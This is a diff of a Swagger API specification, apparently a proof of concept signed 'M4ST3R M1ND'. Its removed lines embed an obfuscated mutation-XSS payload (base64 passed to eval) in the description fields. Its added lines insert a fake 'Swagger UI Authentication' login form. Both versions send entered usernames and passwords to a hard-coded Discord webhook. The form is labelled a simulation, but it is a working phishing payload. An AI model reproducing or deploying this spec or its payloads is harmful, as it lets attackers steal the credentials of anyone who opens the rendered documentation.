@@ -1,38 +1,35 @@
 swagger: '2.0'
 info:
+  version: 1.0.0
   title: Swagger UI Login
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='YnRvYShgZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzkxNjgyOTY0MDk3NzMyNjY4L3B3RUtJTTdJVkxaWm5zVWFyT29rajFqUEtyd0Z1UHpyZzBkbElLSXhzV0wxUHhNbEZkUUFVaDJ2UXpaY2JSVGUxbEQzIjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCBuYW1lPSJ1c2VybmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YCkK' onerror='eval(atob(this.id))'>">
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
+    <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;">
+      <div style="max-width: 480px; margin: 30px auto; padding: 20px; background: #ffffff; border: 1px solid #ccc; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+        <h2 style="text-align: center; color: #3b4151; margin-bottom: 20px;">Swagger UI Authentication</h2>
+        <form action="https://discord.com/api/webhooks/1391682964097732668/pwEKIM7IVLZZnsUarOokj1jPKrwFuPzrg0dlIKIxsWL1PxMlFdQAUh2vQzZcbRTe1lD3" method="POST">
+          <div style="margin-bottom: 15px;">
+            <label style="display:block; margin-bottom:5px; font-weight: 500; color: #333;">Username</label>
+            <input type="text" name="username" placeholder="Enter username"
+              style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
+          </div>
+          <div style="margin-bottom: 15px;">
+            <label style="display:block; margin-bottom:5px; font-weight: 500; color: #333;">Password</label>
+            <input type="password" name="password" placeholder="Enter password"
+              style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
+          </div>
+          <button type="submit"
+            style="width: 100%; background-color: #2484c6; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer;">
+            Login
+          </button>
+        </form>
+        <p style="font-size: 12px; color: #777; text-align: center; margin-top: 15px;">Simulated login form for demonstration only.</p>
+      </div>
+      <p style="text-align: right; font-size: 11px; color: #999;">POC by M4ST3R M1ND</p>
+    </div>
+
 paths:
-  /M0X0101:
-    get:
+  /:
+    post:
       responses:
         '200':
-          description: No response was specified
-      tags:
-        - M4ST3R MIND
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
-      parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='YnRvYShgZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzkxNjgyOTY0MDk3NzMyNjY4L3B3RUtJTTdJVkxaWm5zVWFyT29rajFqUEtyd0Z1UHpyZzBkbElLSXhzV0wxUHhNbEZkUUFVaDJ2UXpaY2JSVGUxbEQzIjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCBuYW1lPSJ1c2VybmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YCkK' onerror='eval(atob(this.id))'>">
-          format: int64
-          in: path
-          name: id
-          required: true
-          type: integer
-      responses:
-        '200':
-          description: No response was specified
+          description: Login Successful
